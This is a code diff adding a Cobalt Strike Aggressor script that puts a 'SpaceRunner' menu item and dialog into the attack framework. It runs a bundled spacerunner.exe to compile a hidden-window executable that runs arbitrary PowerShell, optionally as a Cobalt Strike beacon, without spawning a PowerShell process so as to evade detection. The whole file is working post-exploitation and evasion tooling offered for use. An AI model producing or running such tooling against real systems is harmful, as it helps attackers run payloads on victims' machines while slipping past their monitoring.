@@ -1,0 +1,41 @@
+sub SpaceRunner{
+    local('$_type $_generater $_isbeacon $_hide $_func $_args $_file');
+    #$_type = $3['type'];
+    $_isbeacon = " -b ";
+    $_hide = " -h ";
+    $_func = " -f ".$3['func'];
+    $_args = " -a ".$3['args'];
+    $_generater = script_resource("post\\SpaceRunner\\spacerunner.exe");
+    #TODO support remote file
+    #if($_type eq "Local"){
+        $_file = $3['lfile'];
+        $cmd = $_generater." -i ".$_file." -o ".script_resource("bin\\server-".getFileName($_file).".exe");
+        if($3['hide'] eq "true"){
+            $cmd = $cmd.$_hide;
+        }
+        if($3['beacon'] eq "true"){
+            $cmd = $cmd.$_isbeacon;
+        }
+        if($3['func'] ne ""){
+            $cmd = $cmd.$_func;
+        }
+        if($3['args'] ne ""){
+            $cmd = $cmd.$_args;
+        }
+        exec($cmd);
+        show_message("Save success: ".script_resource("bin\\server-".getFileName($_file).".exe"));
+    #}
+}
+item "SpaceRunner"{
+    $Dialog = dialog("SpaceRunner",%(),&SpaceRunner);
+    dialog_description($Dialog, "This tool enables the compilation of a C# program that will execute arbitrary PowerShell code, without launching PowerShell processes through the use of runspace. ");
+    #drow_combobox($Dialog, "type",  "Generate type: ", @("Local","Remote"));
+    drow_file($Dialog, "lfile", "Local PS file: ");
+    #drow_text($Dialog, "rfile", "Remote PS file: ");
+    drow_text($Dialog, "func", "Function to call: ");
+    drow_text($Dialog, "args", "Function arguments to pass: ");
+    drow_checkbox($Dialog, "beacon", "Cobalt Strike beacon: ", "");
+    drow_checkbox($Dialog, "hide", "Set window's hide state: ", "");
+    dbutton_action($Dialog, "Generate");
+    dialog_show($Dialog);
+}
